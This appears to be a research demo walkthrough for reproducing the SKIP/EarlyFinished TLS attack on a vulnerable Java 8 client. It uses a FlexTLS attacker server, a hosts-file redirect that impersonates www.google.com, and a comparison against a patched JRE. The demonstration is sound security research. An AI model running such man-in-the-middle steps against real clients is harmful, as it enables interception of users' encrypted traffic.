

SKIP demo instructions 

1. Install all dependencies 

Install Cygwin-64 and include the {openssl, openssl-perl, make} packages. 

Start VS2015.  Clone github.com/mitls/mitls-f7.  Open the solution (you’ll have 
to right-click on a project to install F#), set FlexApps to be the StartUp 
project and build a Release config build. VS will also prompt to install Git 
For Windows; do that. 

Download and install jdk-8-windows-x64.exe from http://www.oracle.com/technetwork/java/javase/downloads/java-archive-javase8-2177648.html
This version is vulnerable to SKIP

Download and install e.g. jre-8u71-windows-x64 from http://www.oracle.com/technetwork/java/javase/downloads/java-archive-javase8-2177648.html
This version is patched for SKIP

2. Three consoles

We'll need three terminals for the demo:

PS Admin: an Admin-level Powershell terminal to edit drivers\etc\hosts
PSServer: a Powershell terminal to run the server
BashClient: a Cygwin bash terminal to run the client

3. [BashClient] Start a Cygwin bash temrinal, and set

$ alias java-1.8.0="/cygdrive/c/Program\ Files/Java/jdk1.8.0/jre/bin/java.exe"
$ # java will call the later, patched one
$ alias javac="/cygdrive/c/Program\ Files/Java/jdk1.8.0/bin/javac.exe"

3. [BashClient] Compile and run the simple java client: 

$ cd mitls-flex/flex/FlexApps/
$ javac client.java

Check that with a vulnerable version, we get www.google.com webpage

$ java-1.8.0 client https://www.google.com
<html>...

4. [PSAdmin] Set up the MITM

Open an elevated PowerShell. 

PS> echo '127.0.0.1 www.google.com' > .\drivers\etc\hosts

5. [PSServer] Start flexTLS server attacker

Start a PS console. 

The SKIP scenario expects to find the google certificate chain in the current
directory, so cd to where we're already got the certificates:

PS> cd /mitls-flex/tests/pki/rsa/certificates

(In case these expire, you can use openssl to get another three:
$ openssl s_client -connect HOST:PORTNUMBER -showcerts. 
See  https://blog.avisi.nl/2012/09/12/quick-way-to-retrieve-a-chain-of-ssl-certificates-from-a-server/, 
for instance.)

Now start the server:

PS> PATH2HERE/mitls-flex/flex/FlexApps/bin/Release/FlexApps.exe -s efin --accept 127.0.0.1

6. [BashClient] Run clients

Start a Cygwin bash terminal, and cd to mitls-flex/flex/FlexApps.

Run Java client using vulnerable JRE 
$ java-1.8.0 client https://www.google.com
You are vulnerable to the EarlyFinished attack!

Check that the patched version is not vulnerable
$ java client
Exception in thread "main" javax.net.ssl.SSLHandshakeException: Received Finished message before ChangeCipherSpec
...

7. [PSAdmin] Afterwards, make sure you reset the hosts file:

PS> echo '#127.0.0.1 www.google.com' > .\drivers\etc\hosts
